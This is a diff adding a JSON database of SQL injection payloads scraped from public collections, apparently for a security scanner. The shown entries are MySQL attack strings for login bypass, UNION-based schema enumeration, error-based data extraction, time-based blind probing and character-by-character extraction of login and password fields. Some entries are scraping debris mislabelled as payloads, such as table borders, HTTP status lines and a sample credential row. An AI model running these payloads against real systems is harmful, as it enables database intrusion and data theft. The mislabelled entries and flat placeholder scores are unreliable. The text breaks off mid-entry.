@@ -1,0 +1,2904 @@
+{
+  "metadata": {
+    "total_payloads": 226,
+    "sources": [
+      {
+        "name": "PayloadAllTheThings-MySQL",
+        "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/MySQL%20Injection.md",
+        "format": "markdown",
+        "category": "sqli-mysql",
+        "last_updated": "2026-02-12T23:34:21.646835",
+        "enabled": true
+      },
+      {
+        "name": "PayloadAllTheThings-PostgreSQL",
+        "url": "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/PostgreSQL%20Injection.md",
+        "format": "markdown",
+        "category": "sqli-postgresql",
+        "last_updated": "2026-02-12T23:34:21.718218",
+        "enabled": true
+      },
+      {
+        "name": "SecLists-SQLi",
+        "url": "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Fuzzing/Databases/sqli.txt",
+        "format": "txt",
+        "category": "sqli-generic",
+        "last_updated": null,
+        "enabled": true
+      }
+    ],
+    "exported_at": "2026-02-12T23:34:21.779072"
+  },
+  "payloads": [
+    {
+      "id": "PL-E510CB866815",
+      "content": "' False",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-B5E6F3BCDB57",
+      "content": "'' True",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-BE942FF463A5",
+      "content": "\" False",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-60091A142BB1",
+      "content": "\"\" True",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-538A97BCD545",
+      "content": "\\ False",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-B305122F09BC",
+      "content": "\\\\ True",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-1470505217F5",
+      "content": "AND 1     True",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-AC66AF2A1B72",
+      "content": "AND 0     False",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-138E273F31C2",
+      "content": "AND true True",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-0FE45C3A97F6",
+      "content": "AND false False",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-96876343FF74",
+      "content": "1-false     Returns 1 if vulnerable",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-8104A89A7587",
+      "content": "1-true     Returns 0 if vulnerable",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-7B00E0D30A1E",
+      "content": "1*56     Returns 56 if vulnerable",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-D16BC32ABD48",
+      "content": "1*56     Returns 1 if not vulnerable",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-7A6033F24833",
+      "content": "' OR '1",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-4BBB7785F346",
+      "content": "' OR 1 -- -",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-59C5BF06B6AC",
+      "content": "\" OR \"\" = \"",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-750439EB91E7",
+      "content": "\" OR 1 = 1 -- -",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-714BD582FBCC",
+      "content": "'='",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-C241596810B9",
+      "content": "'LIKE'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-169EFBBD22B2",
+      "content": "'=0--+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-77485C307F96",
+      "content": "UNION SELECT NULL;--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-5DF14C8B2BDE",
+      "content": "UNION SELECT NULL, NULL;--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-51A5BAA342E9",
+      "content": "UNION SELECT NULL, NULL, NULL;--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-1E84BB95578A",
+      "content": "ORDER BY 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30,31,32,33,34,35,36,37,38,39,40,41,42,43,44,45,46,47,48,49,50,51,52,53,54,55,56,57,58,59,60,61,62,63,64,65,66,67,68,69,70,71,72,73,74,75,76,77,78,79,80,81,82,83,84,85,86,87,88,89,90,91,92,93,94,95,96,97,98,99,100--+ # Unknown column '4' in 'order clause'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-97B054DF223C",
+      "content": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-0B72F63EF3A7",
+      "content": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=PLACEHOLDER",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-7B112A7C65B3",
+      "content": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=...",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-673EB3469002",
+      "content": "UNION SELECT 1,2,3,4,...,GROUP_CONCAT(0x7c,data,0x7C) FROM ...",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based"
+      ]
+    },
+    {
+      "id": "PL-4810E4A45B8F",
+      "content": "SELECT `4` FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)DBNAME;",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based"
+      ]
+    },
+    {
+      "id": "PL-8CFBD9192D09",
+      "content": "MariaDB [dummydb]> SELECT AUTHOR_ID,TITLE FROM POSTS WHERE AUTHOR_ID=-1 UNION SELECT 1,(SELECT CONCAT(`3`,0X3A,`4`) FROM (SELECT 1,2,3,4,5,6 UNION SELECT * FROM USERS)A LIMIT 1,1);",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-5C28B823039C",
+      "content": "+-----------+-----------------------------------------------------------------+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-F24D540B6A02",
+      "content": "| author_id | title                                                           |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-AE027E60B738",
+      "content": "|         1 | a45d4e080fc185dfa223aea3d0c371b6cc180a37:veronica80@example.org |",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-5FA180EF3D89",
+      "content": "(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-E8AD3B5EDA46",
+      "content": "'+(SELECT 1 AND ROW(1,1)>(SELECT COUNT(*),CONCAT(CONCAT(@@VERSION),0X3A,FLOOR(RAND()*2))X FROM (SELECT 1 UNION SELECT 2)A GROUP BY X LIMIT 1))+'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "union-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-E2C0D47F2E72",
+      "content": "AND UPDATEXML(rand(),CONCAT(CHAR(126),version(),CHAR(126)),null)-",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-5726DCD1082D",
+      "content": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)),null)--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-14FE82F3C1AC",
+      "content": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),TABLE_NAME,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)),null)--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-3D67DA6AA4EB",
+      "content": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)),null)--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-0C9AD60709F2",
+      "content": "AND UPDATEXML(rand(),CONCAT(0x3a,(SELECT CONCAT(CHAR(126),data_info,CHAR(126)) FROM data_table.data_column LIMIT data_offset,1)),null)--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-3B3037D7BB24",
+      "content": "UPDATEXML(null,CONCAT(0x0a,version()),null)-- -",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-F3ADE89C2471",
+      "content": "UPDATEXML(null,CONCAT(0x0a,(select table_name from information_schema.tables where table_schema=database() LIMIT 0,1)),null)-- -",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-25284EA10381",
+      "content": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(CHAR(126),VERSION(),CHAR(126)))--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-9F14701773BA",
+      "content": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),schema_name,CHAR(126)) FROM information_schema.schemata LIMIT data_offset,1)))--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-765D5DF70EF1",
+      "content": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),table_name,CHAR(126)) FROM information_schema.TABLES WHERE table_schema=data_column LIMIT data_offset,1)))--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-94B5B2391413",
+      "content": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),column_name,CHAR(126)) FROM information_schema.columns WHERE TABLE_NAME=data_table LIMIT data_offset,1)))--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-A8DC7B48AC35",
+      "content": "?id=1 AND EXTRACTVALUE(RAND(),CONCAT(0X3A,(SELECT CONCAT(CHAR(126),data_column,CHAR(126)) FROM data_schema.data_table LIMIT data_offset,1)))--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-22431EAB0251",
+      "content": "?id=1 AND (SELECT * FROM (SELECT NAME_CONST(version(),1),NAME_CONST(version(),1)) as x)--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-C183638506C2",
+      "content": "?id=1 AND (SELECT * FROM (SELECT NAME_CONST(user(),1),NAME_CONST(user(),1)) as x)--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-77368F51474D",
+      "content": "?id=1 AND (SELECT * FROM (SELECT NAME_CONST(database(),1),NAME_CONST(database(),1)) as x)--",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-512EB034318B",
+      "content": "?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables > 'A'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-F24D9E7EE746",
+      "content": "?id=1 AND SELECT SUBSTR(column_name,1,1) FROM information_schema.columns > 'A'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-C28E153E5D3F",
+      "content": "?id=1 AND ASCII(LOWER(SUBSTR(version(),1,1)))=51",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-C75C7C6D58CB",
+      "content": "2100935' OR IF(MID(@@version,1,1)='5',sleep(1),1)='2",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-54472D1DA4B0",
+      "content": "Response:",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-2BC80DEDE6A5",
+      "content": "HTTP/1.1 500 Internal Server Error",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-D8CCAD902F0C",
+      "content": "2100935' OR IF(MID(@@version,1,1)='4',sleep(1),1)='2",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-26C1E7B2E4B9",
+      "content": "HTTP/1.1 200 OK",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-21C535BD87FB",
+      "content": "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(version()))),1)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-5C1AB366E2AF",
+      "content": "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(version(),POS,1)),1)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-3443C5EDD0A0",
+      "content": "AND MAKE_SET(VALUE_TO_EXTRACT<(SELECT(length(concat(login,password)))),1)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-8F321C6F1FB0",
+      "content": "AND MAKE_SET(VALUE_TO_EXTRACT<ascii(substring(concat(login,password),POS,1)),1)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-10091BC430EF",
+      "content": "SELECT cust_code FROM customer WHERE cust_name LIKE 'k__l';",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-BEB8D8D50EA3",
+      "content": "SELECT * FROM products WHERE product_name LIKE '%user_input%'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-36BC3EE0D32E",
+      "content": "+BENCHMARK(40000000,SHA1(1337))+",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-E8A98C6BDF2B",
+      "content": "'+BENCHMARK(3200,SHA1(1))+'",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": []
+    },
+    {
+      "id": "PL-A3179059464F",
+      "content": "AND [RANDNUM]=BENCHMARK([SLEEPTIME]000000,MD5('[RANDSTR]'))",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-334A6741A136",
+      "content": "RLIKE SLEEP([SLEEPTIME])",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based"
+      ]
+    },
+    {
+      "id": "PL-AC90A6DB9F34",
+      "content": "OR ELT([RANDNUM]=[RANDNUM],SLEEP([SLEEPTIME]))",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-06A61AC26BD1",
+      "content": "XOR(IF(NOW()=SYSDATE(),SLEEP(5),0))XOR",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-E9CF11447885",
+      "content": "AND SLEEP(10)=0",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-8F220A96565E",
+      "content": "AND (SELECT 1337 FROM (SELECT(SLEEP(10-(IF((1=1),0,10))))) RANDSTR)",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based"
+      ]
+    },
+    {
+      "id": "PL-20C357DE7A01",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '%')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-87352864849B",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '___')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-C00709330E11",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '____')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-CA0D3FFC8EB4",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE '_____')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-806D5BB67DA3",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'A____')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-CBA9BFFFFB3C",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'S____')#",
+      "category": "sqli-mysql",
+      "source": "PayloadAllTheThings-MySQL",
+      "effectiveness_score": 0.5,
+      "database_type": null,
+      "technique": null,
+      "description": null,
+      "tags": [
+        "time-based",
+        "boolean-based",
+        "comment-injection"
+      ]
+    },
+    {
+      "id": "PL-73B67F5B8534",
+      "content": "1 AND (SELECT SLEEP(10) FROM DUAL WHERE DATABASE() LIKE 'SA___')#",
